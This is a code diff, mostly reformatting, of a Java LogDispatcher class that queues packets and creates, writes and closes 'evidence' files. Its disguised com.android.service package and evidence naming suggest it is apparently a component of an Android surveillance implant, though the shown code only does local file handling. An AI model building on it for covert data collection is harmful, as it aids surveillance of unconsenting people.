@@ -25,10 +25,12 @@ import com.android.service.file.Path;
 import com.android.service.util.Check;
 
 /**
- * The Class LogDispatcher collects LogR messages and manages the evidence creation, write and close.
+ * The Class LogDispatcher collects LogR messages and manages the evidence
+ * creation, write and close.
  */
 public class LogDispatcher extends Thread implements Runnable {
-
+	private static final String TAG = "LogDispatcher";
+	
 	/** The singleton. */
 	private volatile static LogDispatcher singleton;
 
@@ -49,9 +51,6 @@ public class LogDispatcher extends Thread implements Runnable {
 
 	/** The no logs. */
 	final Condition noLogs = lock.newCondition();
-
-	/** The TAG. */
-	private final String TAG = "LogDispatcher";
 
 	/*
 	 * private BroadcastReceiver mExternalStorageReceiver; private boolean
@@ -84,7 +83,8 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private void processQueue() {
 		Packet p;
-		// if(AutoConfig.DEBUG) Log.d("QZ", TAG + " processQueue() Packets in Queue: " + q.size());
+		// if(AutoConfig.DEBUG) Log.d("QZ", TAG +
+		// " processQueue() Packets in Queue: " + q.size());
 
 		if (queue.size() == 0) {
 			return;
@@ -93,30 +93,33 @@ public class LogDispatcher extends Thread implements Runnable {
 		try {
 			p = queue.take();
 		} catch (final InterruptedException e) {
-			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if (Cfg.DEBUG) {
+				e.printStackTrace();
+			}
 			return;
 		}
 
 		switch (p.getCommand()) {
-			case LogR.LOG_CREATE:
-				createLog(p);
-				break;
+		case LogR.LOG_CREATE:
+			createLog(p);
+			break;
 
-			case LogR.LOG_ATOMIC:
-				atomicLog(p);
-				break;
+		case LogR.LOG_ATOMIC:
+			atomicLog(p);
+			break;
 
-			case LogR.LOG_WRITE:
-				writeLog(p);
-				break;
+		case LogR.LOG_WRITE:
+			writeLog(p);
+			break;
 
-			case LogR.LOG_CLOSE:
-				closeLog(p);
-				break;
+		case LogR.LOG_CLOSE:
+			closeLog(p);
+			break;
 
-			default:
-				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
-				break;
+		default:
+			if (Cfg.DEBUG)
+				Log.d("QZ", TAG + " Error: " + "processQueue() got LOG_UNKNOWN");
+			break;
 		}
 
 		return;
@@ -146,7 +149,8 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	@Override
 	public void run() {
-		if(Cfg.DEBUG) Log.d("QZ", TAG + " LogDispatcher started");
+		if (Cfg.DEBUG)
+			Log.d("QZ", TAG + " LogDispatcher started");
 
 		// Create log directory
 		sdDir = new File(Path.logs());
@@ -167,13 +171,16 @@ public class LogDispatcher extends Thread implements Runnable {
 				if (halt == true) {
 					queue.clear();
 					evidences.clear();
-					if(Cfg.DEBUG) Log.d("QZ", TAG + " LogDispatcher closing");
+					if (Cfg.DEBUG)
+						Log.d("QZ", TAG + " LogDispatcher closing");
 					return;
 				}
 
 				processQueue();
 			} catch (final InterruptedException e) {
-				if(Cfg.DEBUG) { e.printStackTrace(); }
+				if (Cfg.DEBUG) {
+					e.printStackTrace();
+				}
 			} finally {
 				lock.unlock();
 			}
@@ -198,7 +205,9 @@ public class LogDispatcher extends Thread implements Runnable {
 				noLogs.signal();
 			}
 		} catch (final Exception e) {
-			if(Cfg.DEBUG) { e.printStackTrace(); }
+			if (Cfg.DEBUG) {
+				e.printStackTrace();
+			}
 		} finally {
 			lock.unlock();
 		}
@@ -220,7 +229,6 @@ public class LogDispatcher extends Thread implements Runnable {
 		}
 	}
 
-
 	/**
 	 * Creates the log.
 	 * 
@@ -229,12 +237,12 @@ public class LogDispatcher extends Thread implements Runnable {
 	 * @return true, if successful
 	 */
 	private boolean createLog(final Packet p) {
-		Check.ensures(!evidences.containsKey(p.getId()),
+		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
 				"evidence already mapped");
 
 		final byte[] additional = p.getAdditional();
 		final Evidence evidence = new Evidence(p.getType());
-		if(evidence.createEvidence(additional)){
+		if (evidence.createEvidence(additional)) {
 			evidences.put(p.getId(), evidence);
 		}
 
@@ -249,12 +257,13 @@ public class LogDispatcher extends Thread implements Runnable {
 	 *            the p
 	 */
 	private void atomicLog(final Packet p) {
-		Check.ensures(!evidences.containsKey(p.getId()), "evidence already mapped");
+		if(Cfg.DEBUG) Check.ensures(!evidences.containsKey(p.getId()),
+				"evidence already mapped");
 
 		final byte[] additional = p.getAdditional();
 		final byte[] data = p.peek();
 		final Evidence evidence = new Evidence(p.getType());
-		
+
 		evidence.createEvidence(additional);
 		evidence.writeEvidence(data);
 		evidence.close();
@@ -269,13 +278,14 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean writeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Requested log not found");
+			if (Cfg.DEBUG)
+				Log.d("QZ", TAG + " Requested log not found");
 			return false;
 		}
 
 		final Evidence evidence = evidences.get(p.getId());
 		final boolean ret = evidence.writeEvidence(p.peek());
-		
+
 		return ret;
 	}
 
@@ -288,7 +298,8 @@ public class LogDispatcher extends Thread implements Runnable {
 	 */
 	private boolean closeLog(final Packet p) {
 		if (evidences.containsKey(p.getId()) == false) {
-			if(Cfg.DEBUG) Log.d("QZ", TAG + " Requested log not found");
+			if (Cfg.DEBUG)
+				Log.d("QZ", TAG + " Requested log not found");
 			return false;
 		}
 
@@ -298,7 +309,6 @@ public class LogDispatcher extends Thread implements Runnable {
 
 		return true;
 	}
-
 
 	/*
 	 * Inserire un Intent-receiver per gestire la rimozione della SD private
